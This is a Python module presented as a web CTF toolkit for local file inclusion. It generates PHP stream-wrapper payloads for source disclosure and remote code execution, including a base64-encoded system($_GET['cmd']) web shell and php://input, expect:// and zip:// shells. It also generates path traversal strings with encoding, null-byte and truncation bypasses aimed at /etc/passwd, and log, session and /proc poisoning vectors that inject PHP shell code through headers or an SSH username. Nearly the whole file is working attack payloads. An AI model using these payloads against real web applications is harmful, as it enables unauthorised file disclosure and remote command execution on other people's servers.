"""
LFI (Local File Inclusion), PHP Wrappers, and Log Poisoning Toolkit for Web CTF.
Covers PHP filter tricks, traversal bypasses, and poisoning vectors.
"""

from typing import List, Dict

def get_php_wrappers(filename: str = "index.php") -> List[Dict[str, str]]:
    """Generate PHP stream wrappers for source code disclosure and code execution."""
    return [
        {
            "name": "PHP Filter Base64 Read (Most Common)",
            "payload": f"php://filter/convert.base64-encode/resource={filename}",
            "desc": "Reads PHP source file encoded in Base64 before server executes it."
        },
        {
            "name": "PHP Filter ROT13 Read",
            "payload": f"php://filter/string.rot13/resource={filename}",
            "desc": "Bypasses keyword/base64 filters using ROT13 stream."
        },
        {
            "name": "PHP Filter Multi-Chained Filters",
            "payload": f"php://filter/string.strip_tags|convert.base64-encode/resource={filename}",
            "desc": "Chains multiple filter conversions."
        },
        {
            "name": "PHP Data Wrapper RCE (POST/GET)",
            "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "desc": "Executes PHP code via data:// wrapper (<?php system($_GET['cmd']); ?>)."
        },
        {
            "name": "PHP Input Stream RCE",
            "payload": "php://input",
            "desc": "Send '<?php system(\"id\"); ?>' as raw HTTP POST request body."
        },
        {
            "name": "PHP Expect Wrapper RCE",
            "payload": "expect://id",
            "desc": "Direct command execution if php-expect module is installed."
        },
        {
            "name": "ZIP / PHAR Archive Inclusion",
            "payload": f"zip://uploads/shell.zip%23shell.php&cmd=id",
            "desc": "Executes compressed PHP script inside uploaded zip archive."
        }
    ]

def get_traversal_bypasses(target_file: str = "/etc/passwd") -> List[Dict[str, str]]:
    """Generate Path Traversal payloads with filter bypasses."""
    tf_clean = target_file.lstrip("/")
    return [
        {
            "name": "Standard Dot-Dot-Slash",
            "payload": f"../../../../../../../../{tf_clean}",
            "desc": "Traverses back to filesystem root."
        },
        {
            "name": "Nested Strip Bypass (....//)",
            "payload": f"....//....//....//....//....//{tf_clean}",
            "desc": "Bypasses simple non-recursive string replacement of '../'."
        },
        {
            "name": "URL Encoded Traversal (%2e%2e%2f)",
            "payload": f"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{tf_clean}",
            "desc": "Single URL encoded dots and slashes."
        },
        {
            "name": "Double URL Encoded (%252e%252e%252f)",
            "payload": f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{tf_clean}",
            "desc": "Double URL encoding to bypass reverse proxy decoders."
        },
        {
            "name": "Null Byte Termination (%00)",
            "payload": f"../../../../../../../../{tf_clean}%00.php",
            "desc": "Truncates trailing extensions in PHP <= 5.3.4."
        },
        {
            "name": "Path Truncation (. / . / . /)",
            "payload": f"../../../../../../../../{tf_clean}" + "/." * 200,
            "desc": "Exceeds OS MAX_PATH buffer limit to drop appended extension."
        }
    ]

def get_poisoning_targets() -> List[Dict[str, str]]:
    """Common LFI log and session poisoning file paths."""
    return [
        {
            "name": "Apache Access Log",
            "path": "/var/log/apache2/access.log",
            "technique": "Poison User-Agent header with: <?php system($_GET['c']); ?>"
        },
        {
            "name": "Nginx Access Log",
            "path": "/var/log/nginx/access.log",
            "technique": "Send HTTP request with <?php system($_GET['c']); ?> in headers"
        },
        {
            "name": "SSH Auth Log",
            "path": "/var/log/auth.log",
            "technique": "Run: ssh '<?php system($_GET[\"c\"]); ?>'@target_ip"
        },
        {
            "name": "PHP Session File",
            "path": "/tmp/sess_<PHPSESSID> or /var/lib/php/sessions/sess_<PHPSESSID>",
            "technique": "Store PHP payload in session value or cookie and include session file"
        },
        {
            "name": "Linux Process Environ",
            "path": "/proc/self/environ",
            "technique": "Inject PHP code into User-Agent or HTTP headers captured in environment"
        },
        {
            "name": "Linux File Descriptors",
            "path": "/proc/self/fd/0 to /proc/self/fd/30",
            "technique": "Include active request stream descriptors"
        }
    ]
